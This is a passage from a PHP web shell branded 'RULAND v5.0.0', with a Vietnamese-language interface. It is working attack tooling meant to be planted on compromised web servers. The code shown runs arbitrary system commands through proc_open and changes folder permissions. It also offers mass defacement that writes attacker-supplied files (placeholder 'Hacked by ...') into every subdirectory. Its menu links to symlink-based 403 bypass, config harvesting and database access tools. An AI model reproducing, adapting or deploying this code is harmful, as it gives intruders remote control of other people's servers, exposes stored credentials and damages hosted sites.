    // ==================== CHMOD FOLDER ====================
    if(isset($_GET["action"]) && $_GET["action"] === "chmodfolder" && isset($_GET["folder"]) && isset($_POST["chmodfolder"])){
        $folderPath = $path . "/" . $_GET["folder"];
        $newPerms = intval($_POST["new_perms"], 8);
        if(file_exists($folderPath) && is_dir($folderPath)){
            if(chmod($folderPath, $newPerms)){
                $_SESSION["success"] = "Đã thay đổi phân quyền thành công!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            } else {
                $_SESSION["error"] = "Thay đổi phân quyền thất bại!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            }
        }
    }
    ?>

    <!-- Main Layout -->
    <div class="relative z-10 flex min-h-screen">
        <!-- Sidebar Overlay (Mobile) -->
        <div id="sidebar-overlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>

        <!-- Sidebar -->
        <aside id="sidebar" class="sidebar glass-effect-strong flex-shrink-0 overflow-y-auto flex flex-col">
            <div class="p-5 border-b border-green-500/20">
                <div class="flex items-center gap-3">
                    <svg class="w-8 h-8 text-green-400" fill="currentColor" viewBox="0 0 24 24">
                        <path fill-rule="evenodd" d="M12 2a10 10 0 1 0 10 10A10.011 10.011 0 0 0 12 2Zm0 5a3 3 0 1 0 0 6 3 3 0 0 0 0-6Zm-6.5 8A5.483 5.483 0 0 0 6.5 19h11c1.383 0 2.632-.56 3.536-1.464A5.483 5.483 0 0 0 18.5 15h-13Z" clip-rule="evenodd"/>
                    </svg>
                    <div>
                        <h2 class="text-lg font-bold cyber-text-strong tracking-wider">RULAND</h2>
                        <p class="text-xs text-green-400/50">v5.0.0</p>
                    </div>
                </div>
            </div>

            <nav class="p-3 space-y-1 flex-1">
                <p class="sidebar-section-title px-3 py-2">QUẢN LÝ TẬP TIN</p>
                
                <a href="?path=<?=$path?>&action=newfile<?=$toPage?>" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 no-underline">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.5v15m7.5-7.5h-15"/></svg>
                    <span>Tạo Tập Tin Mới</span>
                </a>

                <a href="?path=<?=$path?>&action=newfolder<?=$toPage?>" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 no-underline">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m-3-3h6m-9 8a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5.586a1 1 0 0 1 .707.293l5.414 5.414a1 1 0 0 1 .293.707V19a2 2 0 0 1-2 2H6Z"/></svg>
                    <span>Tạo Thư Mục Mới</span>
                </a>

                <button onclick="document.getElementById('upload-modal').classList.remove('hidden')" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 w-full text-left">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 15v2a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3v-2M12 4v12m0 0-4-4m4 4 4-4"/></svg>
                    <span>Tải Tập Tin Lên</span>
                </button>

                <div class="my-4 border-t border-green-500/10"></div>
                <p class="sidebar-section-title px-3 py-2">CÔNG CỤ HỆ THỐNG</p>

                <a href="?path=<?=$path?>&action=command<?=$toPage?>" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 no-underline">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m8 8-4 4 4 4m8 0 4-4-4-4m-2-3-4 14"/></svg>
                    <span>Thực Thi Lệnh</span>
                </a>

                <a href="?path=<?=$path?>&action=b64decode<?=$toPage?>" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 no-underline">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m9 5 7 7-7 7"/></svg>
                    <span>Giải Mã Base64</span>
                </a>

                <a href="?path=<?=$path?>&action=b64encode<?=$toPage?>" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 no-underline">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m15 5-7 7 7 7"/></svg>
                    <span>Mã Hóa Base64</span>
                </a>

                <div class="my-4 border-t border-green-500/10"></div>
                <p class="sidebar-section-title px-3 py-2">CÔNG CỤ NÂNG CAO</p>

                <a href="?path=<?=$path?>&action=symvhosts<?=$toPage?>" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 no-underline">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.19 8.688a4.5 4.5 0 0 1 1.242 7.244l-4.5 4.5a4.5 4.5 0 0 1-6.364-6.364l1.757-1.757m13.35-.622 1.757-1.757a4.5 4.5 0 0 0-6.364-6.364l-4.5 4.5a4.5 4.5 0 0 0 1.242 7.244"/></svg>
                    <span>Symlink Vhosts</span>
                </a>

                <a href="?path=<?=$path?>&action=sym403<?=$toPage?>" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 no-underline">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 18.364A9 9 0 0 0 5.636 5.636m12.728 12.728A9 9 0 0 1 5.636 5.636m12.728 12.728L5.636 5.636"/></svg>
                    <span>Symlink 403 Bypass</span>
                </a>

                <a href="?path=<?=$path?>&action=grabconfig<?=$toPage?>" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 no-underline">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m5 12 7-7 7 7M5 12l7 7 7-7"/></svg>
                    <span>Thu Thập Cấu Hình</span>
                </a>

                <a href="?path=<?=$path?>&action=adminer<?=$toPage?>" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 no-underline">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75c0 2.278-3.694 4.125-8.25 4.125S3.75 12.403 3.75 10.125V6.375"/></svg>
                    <span>Adminer DB</span>
                </a>

                <a href="?path=<?=$path?>&action=massdeface<?=$toPage?>" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 no-underline">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M5 12l4-4m-4 4 4 4"/></svg>
                    <span>Mass Deface</span>
                </a>

                <div class="my-4 border-t border-green-500/10"></div>

                <a href="?path=<?=$path?>&action=infomin<?=$toPage?>" class="sidebar-item flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-green-400/80 hover:text-green-400 no-underline">
                    <svg class="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11.25 11.25l.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z"/></svg>
                    <span>Thông Tin Hệ Thống</span>
                </a>
            </nav>

            <div class="p-4 border-t border-green-500/20">
                <div class="flex items-center gap-2 text-xs text-green-400/40">
                    <span>nuller private</span>
                    <span>•</span>
                    <span>Fastvnteam</span>
                </div>
                <button onclick="toggleTheme()" class="mt-3 flex items-center gap-2 text-xs text-green-400/60 hover:text-green-400 transition-colors w-full">
                    <svg id="theme-icon" class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                        <path fill-rule="evenodd" d="M12 2.25a.75.75 0 0 1 .75.75v2.25a.75.75 0 0 1-1.5 0V3a.75.75 0 0 1 .75-.75ZM7.5 12a4.5 4.5 0 1 1 9 0 4.5 4.5 0 0 1-9 0Zm9.75-4.5a.75.75 0 0 1 .75.75v2.25a.75.75 0 0 1-1.5 0V8.25a.75.75 0 0 1 .75-.75ZM21 12a.75.75 0 0 1-.75.75h-2.25a.75.75 0 0 1 0-1.5h2.25A.75.75 0 0 1 21 12Z" clip-rule="evenodd"/>
                    </svg>
                    <span>Đổi Giao Diện</span>
                </button>
            </div>
        </aside>

        <!-- Main Content -->
        <main class="flex-1 min-w-0 flex flex-col">
            <!-- Navbar -->
            <nav class="navbar glass-effect-strong px-4 py-3">
                <div class="flex items-center justify-between">
                    <div class="flex items-center gap-3">
                        <button onclick="toggleSidebar()" class="lg:hidden p-2 rounded-lg hover:bg-green-500/10 transition-colors">
                            <svg class="w-6 h-6 text-green-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"/></svg>
                        </button>

                        <div class="hidden sm:flex items-center gap-1 text-sm overflow-x-auto max-w-[50vw]">
                            <?php
                            if(isset($_GET["file"]) && !isset($_GET["path"])){
                                $path = dirname($_GET["file"]);
                            }
                            $path = str_replace("\\", "/", $path);
                            $paths = explode("/", $path);
                            
                            if(!preg_match("/Windows/", $os)){
                                echo '<a href="?path=/" class="flex items-center gap-1 text-green-400/60 hover:text-green-400 transition-colors shrink-0 no-underline">
                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-width="2" d="M4 10h16M8 14h8m-4-9v16m-7 0h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2Z"/></svg>
                                        <span class="hidden md:inline">Gốc</span>
                                      </a>';
                            }
                            
                            $separator_icon = '<svg class="w-4 h-4 text-green-400/30 shrink-0" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m9 5 7 7-7 7"/></svg>';
                            
                            foreach($paths as $id => $pat){
                                if($pat === ""){ continue; }
                                echo '<span class="text-green-400/30 shrink-0">' . (($id != 0) ? $separator_icon : '') . '</span>';
                                echo '<a href="?path=';
                                for($i = 0; $i <= $id; $i++){
                                    echo $paths[$i];
                                    if($i != $id){ echo "/"; }
                                }
                                echo '" class="text-green-400/60 hover:text-green-400 transition-colors truncate max-w-[150px] shrink-0 no-underline">' . htmlspecialchars($pat) . '</a>';
                            }
                            ?>
                        </div>
                    </div>

                    <div class="flex items-center gap-2">
                        <button onclick="document.getElementById('search-modal').classList.remove('hidden')" class="p-2 rounded-lg hover:bg-green-500/10 transition-colors" title="Tìm kiếm">
                            <svg class="w-5 h-5 text-green-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-width="2" d="m21 21-3.5-3.5M17 10a7 7 0 1 1-14 0 7 7 0 0 1 14 0Z"/></svg>
                        </button>
                        <a href="?path=<?=$path.$toPage?>" class="p-2 rounded-lg hover:bg-green-500/10 transition-colors no-underline" title="Làm mới">
                            <svg class="w-5 h-5 text-green-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182"/></svg>
                        </a>
                    </div>
                </div>
            </nav>

            <!-- Content Area -->
            <div class="p-4 md:p-6 flex-1">
                <?php
                // ==================== SYSTEM INFORMATION ====================
                if(isset($_GET["action"]) && $_GET["action"] === "infomin"){
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-green-400" fill="currentColor" viewBox="0 0 24 24">
                            <path fill-rule="evenodd" d="M12 2a10 10 0 1 0 10 10A10.011 10.011 0 0 0 12 2Zm0 5a3 3 0 1 0 0 6 3 3 0 0 0 0-6Zm-6.5 8A5.483 5.483 0 0 0 6.5 19h11c1.383 0 2.632-.56 3.536-1.464A5.483 5.483 0 0 0 18.5 15h-13Z" clip-rule="evenodd"/>
                        </svg>
                        <div>
                            <h2 class="text-2xl font-bold cyber-text-strong">Thông Tin Hệ Thống</h2>
                            <p class="text-sm text-green-400/60">Thông tin chi tiết về máy chủ và môi trường</p>
                        </div>
                    </div>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <?php
                        $info_items = [
                            ['Địa Chỉ IP Máy Chủ', ipserv()],
                            ['Phiên Bản PHP', phpversion()],
                            ['Người Dùng Hiện Tại', get_current_user()],
                            ['Hệ Điều Hành', php_uname('s')],
                            ['Phần Mềm Máy Chủ', ($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A'],
                            ['Thư Mục Gốc Tài Liệu', ($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'N/A'],
                            ['Cổng Máy Chủ', ($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'N/A'],
                            ['Quản Trị Máy Chủ', ($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : 'N/A'],
                        ];
                        foreach($info_items as $item):
                        ?>
                        <div class="flex items-center justify-between p-4 glass-effect rounded-xl">
                            <span class="text-sm text-green-400/80"><?=$item[0]?></span>
                            <span class="text-sm font-bold text-green-400 bg-green-500/5 px-3 py-1 rounded-lg"><?=htmlspecialchars($item[1])?></span>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>
                <?php
                }
                
                // ==================== COMMAND EXECUTION ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "command"){
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-green-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m8 8-4 4 4 4m8 0 4-4-4-4m-2-3-4 14"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold cyber-text-strong">Thực Thi Lệnh</h2>
                            <p class="text-sm text-green-400/60">Thực thi lệnh hệ thống trong thư mục hiện tại</p>
                        </div>
                    </div>
                    
                    <form method="post" action="">
                        <div class="mb-6">
                            <label for="coman" class="block mb-3 text-sm font-medium text-green-400">Lệnh Cần Thực Thi:</label>
                            <input type="text" id="coman" name="coman" class="cyber-input block w-full p-4 text-sm rounded-xl" value="<?php echo(isset($_POST["coman"])) ? htmlspecialchars($_POST["coman"]) : ""; ?>" placeholder="Nhập lệnh hệ thống..." required>
                            <button class="cyber-btn mt-4 w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="execute">
                                <span class="flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m8 8-4 4 4 4m8 0 4-4-4-4m-2-3-4 14"/></svg>
                                    Thực Thi Lệnh
                                </span>
                            </button>
                        </div>
                    </form>
                    
                    <?php if(isset($_POST["execute"])): ?>
                        <?php $coman = $_POST["coman"]; ?>
                        <?php if(empty($coman)): ?>
                            <div class="mt-6 p-4 bg-red-500/10 border border-red-500/30 rounded-xl">
                                <div class="flex items-center gap-2">
                                    <svg class="w-5 h-5 text-red-400 shrink-0" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm7.707-3.707a1 1 0 0 0-1.414 1.414L10.586 12l-2.293 2.293a1 1 0 1 0 1.414 1.414L12 13.414l2.293 2.293a1 1 0 0 0 1.414-1.414L13.414 12l2.293-2.293a1 1 0 0 0-1.414-1.414L12 10.586 9.707 8.293Z" clip-rule="evenodd"/></svg>
                                    <span class="text-red-400 font-medium text-sm">Lệnh không được để trống!</span>
                                </div>
                            </div>
                        <?php else: ?>
                            <?php
                            echo '<div class="mt-6">';
                            echo '<div class="flex items-center justify-between mb-4">';
                            echo '<div>';
                            echo '<h3 class="text-lg font-semibold text-green-400">Kết Quả Thực Thi</h3>';
                            echo '<p class="text-sm text-green-400/60">Đã thực thi: <code class="text-green-400/80">' . htmlspecialchars($coman) . '</code></p>';
                            echo '</div>';
                            echo '<span class="badge-writable text-xs px-3 py-1 rounded-full">Hoàn Tất</span>';
                            echo '</div>';
                            
                            $ler = "2>&1";
                            if(!preg_match("/" . $ler . "/i", $coman)){
                                $coman = $coman . " " . $ler;
                            }
                            $komen = $coman;
                            $pr = "proc_open";
                            
                            if(function_exists($pr)){
                                $tod = @$pr($komen, array(
                                    0 => array("pipe", "r"),
                                    1 => array("pipe", "w"),
                                    2 => array("pipe", "r")
                                ), $crottz, $path);
                                echo '<div class="bg-black/50 rounded-xl p-4 border border-green-500/20">';
                                if (is_resource($tod)) {
                                    echo '<pre class="text-sm text-green-400 font-mono whitespace-pre-wrap break-words overflow-x-auto max-h-[400px]">' . htmlspecialchars(stream_get_contents($crottz[1])) . '</pre>';
                                    @fclose($crottz[0]);
                                    @fclose($crottz[1]);
                                    @fclose($crottz[2]);
                                    @proc_close($tod);
                                } else {
                                    echo '<pre class="text-sm text-red-400 font-mono">Lỗi: Không thể khởi chạy tiến trình bằng proc_open!</pre>';
                                }
                                echo '</div>';
                            } else {
                                echo '<div class="mt-4 p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-xl">';
                                echo '<div class="flex items-center gap-2">';
                                echo '<svg class="w-5 h-5 text-yellow-400 shrink-0" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm9.408-5.5a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2h-.01ZM10 10a1 1 0 1 0 0 2h1v3h-1a1 1 0 1 0 0 2h4a1 1 0 1 0 0-2h-1v-4a1 1 0 0 0-1-1h-2Z" clip-rule="evenodd"/></svg>';
                                echo '<span class="text-yellow-400 font-medium text-sm">Chức năng proc_open bị vô hiệu hóa trên máy chủ này!</span>';
                                echo '</div></div>';
                            }
                            echo '</div>';
                            ?>
                        <?php endif; ?>
                    <?php endif; ?>
                </div>
                <?php
                }
                
                // ==================== MASS DEFACE ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "massdeface"){
                    if(isset($_POST["massdeface"])){
                        if($_POST['mass_type'] == 'mahal'){
                            echo '<div class="glass-effect rounded-2xl p-6 animate-fade-in">';
                            echo '<div class="flex items-center gap-3 mb-6">';
                            echo '<svg class="w-8 h-8 text-pink-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M5 12l4-4m-4 4 4 4"/></svg>';
                            echo '<div><h2 class="text-2xl font-bold text-pink-400">Kết Quả Mass Deface (Nâng Cao)</h2><p class="text-sm text-pink-400/60">Hoàn tất thao tác tải lên hàng loạt đệ quy</p></div>';
                            echo '</div>';
                            echo '<div class="glass-effect rounded-xl p-4 max-h-[400px] overflow-y-auto text-sm text-green-400">';
                            sabun_massal($path, $_POST['file_name'], $_POST['file_content']);
                            echo '</div></div>';
                        } elseif($_POST['mass_type'] == 'murah'){
                            echo '<div class="glass-effect rounded-2xl p-6 animate-fade-in">';
                            echo '<div class="flex items-center gap-3 mb-6">';
                            echo '<svg class="w-8 h-8 text-pink-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M5 12l4-4m-4 4 4 4"/></svg>';
                            echo '<div><h2 class="text-2xl font-bold text-pink-400">Kết Quả Deface Cơ Bản</h2><p class="text-sm text-pink-400/60">Hoàn tất thao tác tải lên cơ bản</p></div>';
                            echo '</div>';
                            echo '<div class="glass-effect rounded-xl p-4 max-h-[400px] overflow-y-auto text-sm text-green-400">';
                            sabun_biasa($path, $_POST['file_name'], $_POST['file_content']);
                            echo '</div></div>';
                        }
                    } else {
                    ?>
                    <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                        <div class="flex items-center gap-3 mb-6">
                            <svg class="w-8 h-8 text-pink-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M5 12l4-4m-4 4 4 4"/></svg>
                            <div>
                                <h2 class="text-2xl font-bold text-pink-400">Mass Deface</h2>
                                <p class="text-sm text-pink-400/60">Tải tập tin lên nhiều thư mục cùng lúc</p>
                            </div>
                        </div>
                        
                        <form action="" method="post">
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                                <label class="radio-card block p-6 glass-effect rounded-xl">
                                    <input type="radio" name="mass_type" value="murah" class="hidden" required checked />
                                    <div class="flex items-center justify-between">
                                        <div>
                                            <h3 class="text-lg font-semibold text-green-400">CƠ BẢN</h3>
                                            <p class="text-sm text-green-400/70 mt-1">Tải lên hàng loạt vào các thư mục hiển thị</p>
                                        </div>
                                    </div>
                                </label>
                                
                                <label class="radio-card block p-6 glass-effect rounded-xl">
                                    <input type="radio" name="mass_type" value="mahal" class="hidden">
                                    <div class="flex items-center justify-between">
                                        <div>
                                            <h3 class="text-lg font-semibold text-green-400">NÂNG CAO</h3>
                                            <p class="text-sm text-green-400/70 mt-1">Tải lên đệ quy vào tất cả thư mục con</p>
                                        </div>
                                    </div>
                                </label>
                            </div>
                            
                            <div class="mb-6">
                                <label for="file_name_mass" class="block mb-3 text-sm font-medium text-green-400">Tên Tập Tin:</label>
                                <input type="text" id="file_name_mass" name="file_name" class="cyber-input block w-full p-4 text-sm rounded-xl" placeholder="index.html" required>
                            </div>

                            <div class="mb-6">
                                <label for="file_content_mass" class="block mb-3 text-sm font-medium text-green-400">Nội Dung Tập Tin:</label>
                                <textarea id="file_content_mass" name="file_content" rows="12" class="cyber-input block w-full p-4 text-sm rounded-xl" placeholder="<h1>Đã xâm nhập bởi ...</h1>" required></textarea>
                            </div>
                            
                            <button class="cyber-btn w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="massdeface">
                                <span class="flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M5 12l4-4m-4 4 4 4"/></svg>
                                    Thực Thi Mass Deface
                                </span>
                            </button>
                        </form>
                    </div>
                    <?php
                    }
                }
                
                // ==================== BASE64 DECODE ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "b64decode"){
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-green-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m9 5 7 7-7 7"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold cyber-text-strong">Giải Mã Base64</h2>
                            <p class="text-sm text-green-400/60">Giải mã chuỗi đã được mã hóa base64</p>
                        </div>
                    </div>
                    
                    <form method="post" action="">
                        <div class="mb-6">
                            <label for="b64decode" class="block mb-3 text-sm font-medium text-green-400">Chuỗi Base64 Cần Giải Mã:</label>
                            <textarea id="b64decode" name="b64decode" rows="8" class="cyber-input block w-full p-4 text-sm rounded-xl" required><?php echo(isset($_POST["b64decode"])) ? htmlspecialchars($_POST["b64decode"]) : ""; ?></textarea>
                            <button class="cyber-btn mt-4 w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="decode">
                                <span class="flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m9 5 7 7-7 7"/></svg>
                                    Giải Mã Base64
                                </span>
                            </button>
                        </div>
                    </form>
                    
                    <?php if(isset($_POST["decode"])): ?>
                        <?php $b64decode = $_POST["b64decode"]; ?>
                        <?php if(empty($b64decode)): ?>
                            <div class="mt-6 p-4 bg-red-500/10 border border-red-500/30 rounded-xl">
                                <div class="flex items-center gap-2">
                                    <svg class="w-5 h-5 text-red-400 shrink-0" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm7.707-3.707a1 1 0 0 0-1.414 1.414L10.586 12l-2.293 2.293a1 1 0 1 0 1.414 1.414L12 13.414l2.293 2.293a1 1 0 0 0 1.414-1.414L13.414 12l2.293-2.293a1 1 0 0 0-1.414-1.414L12 10.586 9.707 8.293Z" clip-rule="evenodd"/></svg>
                                    <span class="text-red-400 font-medium text-sm">Dữ liệu đầu vào không được để trống!</span>
                                </div>
                            </div>
                        <?php else: ?>
                            <?php $decoded = base64_decode($b64decode); ?>
                            <?php if($decoded === false): ?>
                                <div class="mt-6 p-4 bg-red-500/10 border border-red-500/30 rounded-xl">
                                    <div class="flex items-center gap-2">
                                        <svg class="w-5 h-5 text-red-400 shrink-0" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm7.707-3.707a1 1 0 0 0-1.414 1.414L10.586 12l-2.293 2.293a1 1 0 1 0 1.414 1.414L12 13.414l2.293 2.293a1 1 0 0 0 1.414-1.414L13.414 12l2.293-2.293a1 1 0 0 0-1.414-1.414L12 10.586 9.707 8.293Z" clip-rule="evenodd"/></svg>
                                    <span class="text-red-400 font-medium text-sm">Chuỗi Base64 không hợp lệ!</span>
                                </div>
                            <?php else: ?>
                                <div class="mt-6">
                                    <div class="flex items-center justify-between mb-4">
                                        <h3 class="text-lg font-semibold text-green-400">Kết Quả Giải Mã</h3>
                                        <button onclick="copyToClipboard('decoded-output')" class="cyber-btn-outline inline-flex items-center gap-1 px-3 py-1.5 rounded-lg text-xs">
                                            <svg class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7v8a1 1 0 0 0 1 1h6M8 7V6a1 1 0 0 1 1-1h6a1 1 0 0 1 1 1v1m0 0v8a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1V7m0 0H6"/></svg>
                                            Sao Chép
                                        </button>
                                    </div>
                                    <textarea id="decoded-output" rows="8" class="cyber-input block w-full p-4 text-sm rounded-xl font-mono" readonly><?=htmlspecialchars($decoded)?></textarea>
                                </div>
                            <?php endif; ?>
                        <?php endif; ?>
                    <?php endif; ?>
                </div>
                <?php
                }
                
                // ==================== BASE64 ENCODE ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "b64encode"){
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-green-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m15 5-7 7 7 7"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold cyber-text-strong">Mã Hóa Base64</h2>
                            <p class="text-sm text-green-400/60">Mã hóa chuỗi văn bản sang định dạng base64</p>
                        </div>
                    </div>
                    
                    <form method="post" action="">
                        <div class="mb-6">
                            <label for="b64dencode" class="block mb-3 text-sm font-medium text-green-400">Văn Bản Cần Mã Hóa:</label>
                            <textarea id="b64dencode" name="b64dencode" rows="8" class="cyber-input block w-full p-4 text-sm rounded-xl" required><?php echo(isset($_POST["b64dencode"])) ? htmlspecialchars($_POST["b64dencode"]) : ""; ?></textarea>
                            <button class="cyber-btn mt-4 w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="decode">
                                <span class="flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m15 5-7 7 7 7"/></svg>
                                    Mã Hóa Base64
                                </span>
                            </button>
                        </div>
                    </form>
                    
                    <?php if(isset($_POST["decode"])): ?>
                        <?php $b64dencode = $_POST["b64dencode"]; ?>
                        <?php if(empty($b64dencode)): ?>
